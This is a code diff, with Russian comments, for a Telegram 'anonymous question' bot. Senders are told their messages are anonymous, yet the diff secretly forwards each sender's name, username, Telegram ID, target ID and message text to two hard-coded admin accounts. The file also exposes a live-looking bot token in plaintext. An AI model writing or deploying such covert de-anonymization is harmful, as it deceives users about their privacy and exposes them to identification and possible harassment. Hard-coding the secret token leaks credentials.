@@ -3,12 +3,14 @@ import sqlite3
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
+from aiogram.client.default import DefaultBotProperties
 
-# --- ДАННЫЕ (ПРОВЕРЬ ИХ!) ---
+# --- ДАННЫЕ ---
 TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
 ADMIN_IDS = [7919798306, 5275461907]
 
-bot = Bot(token=TOKEN, parse_mode="HTML")
+# Исправлено для новой версии aiogram:
+bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode='HTML'))
 dp = Dispatcher()
 
 def init_db():
@@ -29,7 +31,8 @@ async def start(message: types.Message):
     args = message.text.split()
     if len(args) > 1:
         target = args[1]
-        await message.answer(f"🤫 Пиши анонимно для пользователя <code>{target}</code>\n\n(Нажми на это сообщение и выбери <b>'Ответить'</b>)")
+        # Специальная метка для бота, чтобы он знал ID
+        await message.answer(f"🤫 Пиши анонимно для пользователя <code>{target}</code>\n\n(Обязательно нажми на это сообщение и выбери <b>'Ответить'</b>)")
     else:
         init_db()
         conn = sqlite3.connect("users.db")
@@ -40,53 +43,50 @@ async def start(message: types.Message):
         await message.answer("Меню активировано!", reply_markup=get_main_keyboard(message.from_user.id))
 
 @dp.message(F.text)
-async def handle_all_messages(message: types.Message):
-    # 1. СНАЧАЛА ПРОВЕРЯЕМ АНОНИМКУ (самое важное!)
+async def handle_all(message: types.Message):
+    # ПРОВЕРКА НА АНОНИМКУ
     if message.reply_to_message and "пользователя" in message.reply_to_message.text:
         try:
+            # Вытаскиваем ID получателя
             target_id = message.reply_to_message.text.split("<code>")[1].split("</code>")[0]
             
-            # Отправка получателю
+            # 1. Отправляем вопрос получателю
             await bot.send_message(target_id, f"📥 <b>Новый анонимный вопрос:</b>\n\n{message.text}")
             
-            # ОТПРАВКА ЛОГА ТЕБЕ (почему ты его не видел)
-            u = message.from_user
-            u_link = f"<a href='tg://user?id={u.id}'>{u.full_name}</a>"
-            un = f" (@{u.username})" if u.username else ""
+            # 2. Шлем подробный лог тебе и другу
+            user = message.from_user
+            u_link = f"<a href='tg://user?id={user.id}'>{user.full_name}</a>"
+            un = f" (@{user.username})" if user.username else " (нет юзернейма)"
             
-            log_text = (
-                f"🕵️ <b>ЛОГ АДМИНА</b>\n"
-                f"👤 <b>От:</b> {u_link}{un}\n"
-                f"🎯 <b>Кому (ID):</b> <code>{target_id}</code>\n"
-                f"📝 <b>Текст:</b> {message.text}"
+            log_msg = (
+                f"🕵️ <b>ЛОГ АНОНИМКИ</b>\n"
+                f"👤 <b>ОТ КОГО:</b> {u_link}{un}\n"
+                f"🆔 <b>ID ОТПРАВИТЕЛЯ:</b> <code>{user.id}</code>\n"
+                f"🎯 <b>КОМУ (ID):</b> <code>{target_id}</code>\n"
+                f"📝 <b>ТЕКСТ:</b> {message.text}"
             )
             
             for admin_id in ADMIN_IDS:
-                try: await bot.send_message(admin_id, log_text)
+                try: await bot.send_message(admin_id, log_msg)
                 except: pass
-            
-            await message.answer("✅ Сообщение доставлено!")
-            return # Выходим, чтобы кнопки ниже не срабатывали
-        except:
-            await message.answer("❌ Ошибка отправки")
+                
+            await message.answer("✅ Доставлено!")
+            return
+        except Exception as e:
+            await message.answer(f"❌ Ошибка: {e}")
             return
 
-    # 2. ПОТОМ ПРОВЕРЯЕМ КНОПКИ
+    # КНОПКИ
     if message.text == "🔗 Моя ссылка":
-        bot_info = await bot.get_me()
-        link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
+        bot_user = await bot.get_me()
+        link = f"https://t.me/{bot_user.username}?start={message.from_user.id}"
         await message.answer(f"Твоя ссылка:\n<code>{link}</code>")
     
     elif message.text == "📊 Статистика" and message.from_user.id in ADMIN_IDS:
         conn = sqlite3.connect("users.db")
         count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
         conn.close()
-        await message.answer(f"Всего юзеров: <b>{count}</b>")
-    
-    else:
-        # Если это просто текст без реплая
-        if message.from_user.id not in ADMIN_IDS:
-            await message.answer("⚠️ Нажми 'Ответить' на сообщение с ID, чтобы отправить анонимку!")
+        await message.answer(f"Всего пользователей: <b>{count}</b>")
 
 async def main():
     init_db()
